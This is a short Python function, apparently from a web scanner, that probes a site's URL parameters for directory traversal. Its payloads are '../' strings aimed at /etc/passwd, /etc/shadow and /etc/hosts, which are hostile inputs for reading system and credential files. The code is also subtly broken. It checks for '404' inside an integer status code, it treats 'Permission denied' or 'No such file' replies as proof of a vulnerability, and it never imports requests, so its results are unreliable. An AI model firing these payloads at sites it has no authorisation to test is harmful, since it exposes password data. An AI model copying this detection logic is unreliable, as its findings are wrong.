# directory_traversal.py
def test_directory_traversal(url, input_fields):
    print(f"Testing for Directory Traversal on {url}")
    vulnerable_params = []
    for field in input_fields:
        name = field[2]
        for payload in ["../../../../etc/passwd", "../../../../etc/shadow", "../../../etc/hosts"]:
            test_url = f"{url}?{name}={payload}"
            response = requests.get(test_url)
            if "Permission denied" in response.text or "No such file" in response.text or "404" in response.status_code:
                print(f"Potential Directory Traversal vulnerability detected in parameter: {name} with payload: {payload}")
                vulnerable_params.append((name, payload))
    return vulnerable_params
